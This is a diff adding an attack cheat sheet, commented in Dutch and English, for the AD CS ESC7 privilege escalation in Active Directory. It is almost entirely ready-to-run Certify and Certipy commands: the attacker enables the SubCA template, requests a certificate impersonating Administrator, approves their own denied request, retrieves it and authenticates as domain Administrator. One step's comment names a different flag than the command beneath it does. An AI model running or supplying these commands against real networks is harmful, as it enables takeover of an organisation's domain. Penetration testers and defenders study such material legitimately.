@@ -1,0 +1,25 @@
+# AD CS ESC7 - Vulnerable Certificate Authority Access Control
+# Aanvaller heeft ManageCA of ManageCertificates rechten op de CA
+# ManageCA = CA Administrator, ManageCertificates = Certificate Manager (Officer)
+# Stap 1: Check CA permissions
+.\Certify.exe cas
+# Zoek naar: "CA Permissions" en je eigen user/groep met ManageCA of Manage Certificates
+# Via Certipy:
+certipy find -u user@domain.local -p Password123! -dc-ip DC_IP -vulnerable
+# Methode A: ManageCA → activeer ESC6 flag + approve requests
+# Stap 2a: Activeer EDITF_ATTRIBUTESUBJECTALTNAME2
+certipy ca -ca domain-CA -enable-template SubCA -u user@domain.local -p Password123!
+# Stap 3a: Request certificaat met SAN (wordt denied → noteer request ID)
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template SubCA -upn Administrator@domain.local
+# Stap 4a: Approve de denied request
+certipy ca -ca domain-CA -issue-request REQUEST_ID -u user@domain.local -p Password123!
+# Stap 5a: Retrieve het goedgekeurde certificaat
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -retrieve REQUEST_ID
+# Stap 6a: Authenticate
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+# Methode B: ManageCertificates → approve pending requests
+# Stap 2b: Iemand anders (of jij) doet een ESC1 request die pending staat
+# Stap 3b: Approve de pending request
+certipy ca -ca domain-CA -issue-request REQUEST_ID -u officer@domain.local -p Password123!
+# Tip: ManageCA kan zichzelf ManageCertificates geven via -add-officer flag
+# Tip: Certipy maakt dit grotendeels automatisch
